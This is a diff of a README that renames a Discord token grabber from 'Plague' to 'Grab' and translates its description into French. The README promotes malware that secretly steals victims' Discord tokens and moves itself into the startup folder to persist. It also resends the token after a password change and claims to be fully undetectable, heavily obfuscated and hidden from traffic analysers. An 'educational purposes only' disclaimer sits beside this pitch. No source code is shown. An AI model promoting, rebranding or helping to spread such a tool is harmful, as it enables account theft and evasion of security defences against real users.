@@ -5,11 +5,11 @@
 <br><br>
 <p align="center">
 <strong>
-Plague is a FUD (fully undetectable) Discord token grabber written in Python3.
+Grab est un FUD (fully undetectable) Discord token grabber écrit en Python3.
 <br>
-Its a token grabber, which moves himself
+Grab est un token grabber qui se dirige tout seul
 <br>
-to the computer startup, and token grabs the victim in background, sending the new token if the password is changed.
+vers le dossier de démarrage de l'ordinateur, et token grabs la victime en arrière-plan, envoyant le nouveau token si le mot de passe est changé.
 <br><br><br>
 </strong>
 </p>
@@ -20,26 +20,26 @@ to the computer startup, and token grabs the victim in background, sending the n
 ### <p align="center">Features</p>
 
 <br><br>
-<strong>+ Fast</strong>
+<strong>+ Rapide</strong>
 <br>
-<strong>+ No extra libraries needed</strong>
+<strong>+ Ne nécessite pas de librairies supplémentaires</strong>
 <br>
-<strong>+ Fully undetectable (FUD)</strong>
+<strong>+ Complétement indétectable (FUD)</strong>
 <br>
-<strong>+ Extreme obfuscation</strong>
+<strong>+ Obfuscation extrême</strong>
 <br>
-<strong>+ Protected from traffic analysers</strong>
+<strong>+ Protégé contre les analyseurs de trafic</strong>
 <br>
-<strong>+ Moving to the computer's startup</strong>
+<strong>+ Se rend directement dans le dossier de démarrage Windows</strong>
 <br>
-<strong>+ Sending the new token if the password is changed</strong>
+<strong>+ Envoie le nouveau token si le mot de passe est changé</strong>
 <br>
 
 <p align="right">
 </p>
 
 <br>
-<strong>- Cannot be compiled to executable (with PyInstaller or Nuitka)</strong>
+<strong>- Ne peut pas être compilé en exécutable (PyInstaller ou Nuitka)</strong>
 <br><br>
 
 -----
@@ -47,8 +47,8 @@ to the computer startup, and token grabs the victim in background, sending the n
 ### <p align="center">📌 Disclaimer 📌</p>
 
 <br><br>
-* ***Please use this program only for educational purposes.***
-* ***It is not meant to be used in any malicious way, and I decline any responsibility for what you do with it.***
+* ***Veuillez utiliser ce programme uniquement à des fins éducatives.***
+* ***Il n'est pas destiné à être utilisé de manière malveillante, et je décline toute responsabilité quant à ce que vous en ferez.***
 <br><br>
 
 -----
